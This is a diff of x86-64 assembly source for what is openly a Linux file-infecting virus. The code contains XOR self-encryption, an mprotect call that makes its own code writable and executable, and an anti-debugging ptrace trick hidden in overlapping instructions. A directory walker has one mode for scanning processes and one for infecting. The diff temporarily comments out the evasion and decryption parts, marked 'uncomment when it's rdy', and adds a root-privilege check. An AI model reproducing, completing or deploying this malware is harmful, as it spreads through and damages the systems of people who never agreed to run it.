@@ -47,42 +47,45 @@ _h3ll0w0rld:
 	; http://infoscience.epfl.ch/record/167546/files/thesis.pdf
 	; Basically it ptrace(0, 0, 0 ,0) to check if something is tracing the
 	; binary (gdb, strace, ...), and then it select host or not launching
-	.dont_gdb_bro:
-	mov rdi, 0x02ebf63148ff3148; xor rdi, rdi; xor rsi, rsi; jmp $+4
+; TODO: uncomment when it's rdy
+;	.dont_gdb_bro:
+;	mov rdi, 0x02ebf63148ff3148; xor rdi, rdi; xor rsi, rsi; jmp $+4
 	; -- has to skip 2 byte of instruction next line
-	mov rsi, 0x02ebc93148d23148; xor rdx, rdx; xor rcx, rcx; push 101 -- ptrace
-	mov rax, 0xc303eb050f58656a; push 101; pop rax; syscall; jmp $+5; ret
-	jmp .dont_gdb_bro + 2
-; = debug
-;	xor rax, rax
+;	mov rsi, 0x02ebc93148d23148; xor rdx, rdx; xor rcx, rcx; push 101 -- ptrace
+;	mov rax, 0xc303eb050f58656a; push 101; pop rax; syscall; jmp $+5; ret
+;	jmp .dont_gdb_bro + 2
+
+; = DEBUG
+	xor rax, rax
 ; =
 
 	cmp rax, 0x0
 	jz .sneakyboi - 2; has to jmp on [48 31 c0] -> xor rax, rax
 	jmp .happy_mix
 	.code: ; so it's crypted right ? EVERYTHING IS KEEEYYY
-		push rdx
-		lea rdi, [rel _start]
-		sub rdi, [rel entry_inject]
-		mov rsi, [rel entry_inject]
-		sub rsi, 8 * 3
-		add rsi, [rel length]
-		push 0x7
-		pop rdx ; PROT_READ | PROT_WRITE | PROT_EXEC
-		push 10
-		pop rax ; mprotect
-		syscall; change protect from file to _eof
-
-		lea rdi, [rel _virus]
-		mov rdx, rdi
-		lea rsi, [rel _params]
-		sub rdx, rsi
-		mov rsi, [rel length]
-		sub rsi, rdx ; length - (_virus - _params)
-		lea rdx, [rel _h3ll0w0rld]
-		mov rcx, KEY_SIZE
-		call _xor_encrypt
-		pop rdx
+; TODO: uncomment when it's rdy
+;		push rdx
+;		lea rdi, [rel _start]
+;		sub rdi, [rel entry_inject]
+;		mov rsi, [rel entry_inject]
+;		sub rsi, 8 * 3
+;		add rsi, [rel length]
+;		push 0x7
+;		pop rdx ; PROT_READ | PROT_WRITE | PROT_EXEC
+;		push 10
+;		pop rax ; mprotect
+;		syscall; change protect from file to _eof
+;
+;		lea rdi, [rel _virus]
+;		mov rdx, rdi
+;		lea rsi, [rel _params]
+;		sub rdx, rsi
+;		mov rsi, [rel length]
+;		sub rsi, rdx ; length - (_virus - _params)
+;		lea rdx, [rel _h3ll0w0rld]
+;		mov rcx, KEY_SIZE
+;		call _xor_encrypt
+;		pop rdx
 
 	jmp .ft_juggling + 5; jmp on eb 24 -> jmp .infected
 	.happy_mix:
@@ -98,27 +101,31 @@ _h3ll0w0rld:
 	mov rdi, 0x03eb583c6a5f016a; push 1; pop rdi; push 60; pop rax; jmp $+5
 	;                            from right to left
 	.ft_juggling:
-	mov rax, 0xc0314824eb050f42; 42[syscall][jmp .infected][xor rax, rax]
+	mov rax, 0xc0314822eb050f42; 42[syscall][jmp .infected][xor rax, rax]
 
 	.sneakyboi:
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 	jnz .code ; .xor_decrypt
 	; copy the prg in memory and launch it cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 
-	.host:
-	mov rax, SYSCALL_FORK; fork
-	syscall
-	cmp rax, 0x0
-	jnz _exit
+; TODO: uncomment when it's rdy
+;	.host:
+;	push SYSCALL_FORK
+;	pop rax; fork
+;	syscall
+;	cmp rax, 0x0
+;	jnz _exit
 
 	; host part
 	call _search_dir
 	jmp _exit
 
 	.infected:
+; TODO: uncomment when it's rdy
 		; --- END OF HELL
-		mov rax, SYSCALL_FORK; fork
-		syscall
+;		push SYSCALL_FORK
+;		pop rax; fork
+;		syscall
 
 		cmp rax, 0x0
 		jz _virus
@@ -317,7 +324,33 @@ ret
 ; packer-part till _eof --------------------------------------------------------
 _pack_start:
 _search_dir:
-	call _h3ll0w0rld + 35; jmp to ret to check for ptrace locked
+; TODO: uncomment when it's rdy
+;	call _h3ll0w0rld + 35; jmp to ret to check for ptrace locked
+
+%ifdef FSOCIETY
+	; TODO: check for root UwU
+	push 107; geteuid
+	pop rax
+	syscall
+
+	cmp rax, 0x0
+	jne .check_process
+
+; TODO remove etc u know what i mean
+;	push SYSCALL_FORK
+;	pop rax; fork
+;	syscall
+
+	cmp rax, 0x0
+	jz _i_am_root
+
+; = DEBUG
+	mov rax, 60
+	syscall
+; =
+%endif
+
+	.check_process:
 	; check for process running
 	push 1
 	pop rsi ; mode for move_through_dir
@@ -340,6 +373,21 @@ _search_dir:
 	cmp byte[rdi + rcx], 0x0
 	jnz .loop_array_string
 	.return:
+ret
+
+_i_am_root:
+	; I am root
+	lea rdi, [rel signature]
+	call _ft_strlen
+	mov rdx, rax
+	mov rsi, rdi
+	mov rdi, 1
+	mov rax, 1
+	syscall
+
+	mov rdi, 0
+	mov rax, 60
+	syscall
 ret
 
 _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
